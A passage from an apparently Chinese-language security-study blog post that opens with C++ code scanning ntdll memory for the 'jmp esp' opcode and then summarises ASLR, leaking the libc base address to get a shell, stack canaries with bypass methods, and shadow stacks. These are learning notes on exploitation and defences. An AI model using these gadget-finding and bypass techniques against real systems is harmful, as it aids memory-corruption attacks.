+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> nRetCode=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> we_load_it=<span class="literal">false</span>;</span><br><span class="line">HINSTANCE h;</span><br><span class="line">TCHAR dllname[]=_T(<span class="string">&quot;ntdll&quot;</span>);       </span><br><span class="line">h=<span class="built_in">GetModuleHandle</span>(dllname);</span><br><span class="line"><span class="keyword">if</span>(h==<span class="literal">NULL</span>)</span><br><span class="line">  &#123;h=<span class="built_in">LoadLibrary</span>(dllname);</span><br><span class="line"><span class="keyword">if</span>(h==<span class="literal">NULL</span>)</span><br><span class="line"> &#123;cout&lt;&lt;<span class="string">&quot;ERROR LOADING DLL:&quot;</span>&lt;&lt;dllname&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">we_load_it=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">BYTE* ptr=(BYTE*)h;</span><br><span class="line"><span class="keyword">bool</span> done=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> y=<span class="number">0</span>;!done;y++)</span><br><span class="line">&#123;<span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(ptr[y]==<span class="number">0xFF</span>&amp;&amp;ptr[y+<span class="number">1</span>]==<span class="number">0xE4</span>)</span><br><span class="line">&#123;<span class="keyword">int</span> pos=(<span class="keyword">int</span>)ptr+y;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;OPCODE found at 0x&quot;</span>&lt;&lt;hex&lt;&lt;pos&lt;&lt;endl;&#125;&#125;</span><br><span class="line"><span class="built_in"><span class="keyword">catch</span></span>(...)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;END OF&quot;</span>&lt;&lt;dllname&lt;&lt;<span class="string">&quot;MEMORY REACHED&quot;</span>&lt;&lt;endl;</span><br><span class="line">done=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(we_load_it)</span><br><span class="line"><span class="built_in">FreeLibrary</span>(h);</span><br><span class="line"><span class="keyword">return</span> nRetCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不知道哪个能用&gt;(●’◡’●)&lt;</p>
+<p><strong>ASLR和PIE</strong></p>
+<p>地址址空间配置随机化（英语：Address space layout randomization，缩写ASLR，又称位址空间配置随机化、位址空间布局随机化）它是一种防范内存损坏漏洞被利用的计算机安全技术。位址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。</p>
+<ul>
+<li>程序每次执行的地址和libc的地址都会随机变化</li>
+<li>使用固定地址的”jmp esp== ‘\xff\xe4’ “攻击失效</li>
+</ul>
+<p><strong>应对手段</strong></p>
+<p><strong>泄漏libc基地址</strong></p>
+<p>即使开启地址随机化，也不是全随机的。对于linux来说，开启ASLR，libc的基地址在每一次启动时都会变化，但是libc本身是整块存入内存的。即libc中指令相对于其基地址的偏移是不会变化的。而libc本身的指令是足够getshell的，所以要对抗ASLR，可以从泄露libc基地址下手。</p>
+<p><strong>stack cookies</strong></p>
+<p>Canary</p>
+<p>在缓冲区和返回地址之间插入一个cookie，函数返回时会检查其是否被修改，如果与插入时的值不一致，则认为发生了缓冲区溢出。</p>
+<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625170722345.png" alt="image-20210625170722345" style="zoom:33%;" />
+
+<ul>
+<li><p>绕过手段 </p>
+</li>
+<li><ul>
+<li>通过信息泄漏漏洞获取cookie</li>
+<li>使用不会覆盖cookie的漏洞</li>
+<li>覆盖其他敏感数据而不是返回地址</li>
+</ul>
+</li>
+</ul>
+<p><strong>影子栈-StackShield</strong></p>
+<ul>
+<li>把正确的返回地址保存在一个攻击者难以接触的地方</li>
+<li>函数返回时把当前返回地址和保存的返回地址比较</li>
+</ul>
+<p>在函数开始是保存RET，在函数返回时比较。</p>
+<ul>
+<li><p>优势 </p>
+</li>
+<li><ul>
+<li>返回地址难以覆盖</li>
+</ul>
+</li>
+<li><p>劣势 </p>
+</li>
+<li><ul>
+<li>高性能开销</li>
+<li>保存的返回地址需要被保护</li>
+<li>兼容性问题</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/06/24/linux1/" rel="prev" title="">
+                  <i class="fa fa-chevron-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/06/25/%E5%B7%A5%E5%85%B7/" rel="next" title="">
+                   <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">FBC</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
